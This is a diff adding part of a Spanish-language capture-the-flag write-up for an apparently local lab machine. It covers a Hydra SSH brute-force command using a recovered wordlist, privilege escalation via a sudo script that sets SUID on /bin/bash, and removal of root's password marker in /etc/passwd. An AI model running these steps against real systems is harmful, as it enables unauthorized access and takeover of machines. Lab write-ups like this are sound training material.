@@ -267,6 +267,49 @@ que al acceder a este obtengo una wordlist de password, asi que me las copio
 
 ![image](https://github.com/user-attachments/assets/7b14c547-f758-44da-a086-70ade4daedc8)
 
+en vista de que tengo el servicio `ssh` activo, procedo a lanzar un ataque de diccionario contra dicho servicio haciendo uso de la wordlist que consegui, pero
+como no tengo un usuario tendre que lanzar un ataque dirigido tanto al user como a la password a ver si consigo algo.
+
+```ruby
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P wordlist.txt ssh://172.17.0.2 -t 50 -I -V
+```
+
+despues de una larga espera, obtuve resultados
+
+![image](https://github.com/user-attachments/assets/eda65292-764e-4c6c-9750-06278560ebcc)
+
+por lo que accedo al sistema!!!
+
+## Escalada de privilegios
+
+### dark
+
+veo que puedo ejecutar un script como `root`
+
+![image](https://github.com/user-attachments/assets/e3462fe6-bb1e-46ef-b019-317d5b034dd7)
+
+ahora inspecciono el contenido del script
+
+![image](https://github.com/user-attachments/assets/0b015ea8-21ed-4194-a1a0-264eb18fcc3f)
+
+en resumen, al ejecutar el script como `root` se le asigna el bir suid a `/bin/bash` lo que nos permitiria una escalada a `root`
+
+```ruby
+sudo /home/dark/hidden.py # ejecutamos el script como root
+
+ls -la /bin/bash # chequeamos los permisos de /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+```
+observamos que en efecto se le asigno el bit suid asi que escalamos con un `/bin/bash -p`
+
+![image](https://github.com/user-attachments/assets/0629cd93-4ac2-4998-a40e-74b4234fab07)
+
+ahora modifico el archivo `/etc/passwd` y elimino la `x` en la linea de `root`
+
+![image](https://github.com/user-attachments/assets/f546a3d6-bd87-4291-8a96-0212d0205268)
+
+### PWNED
+
 
 
 
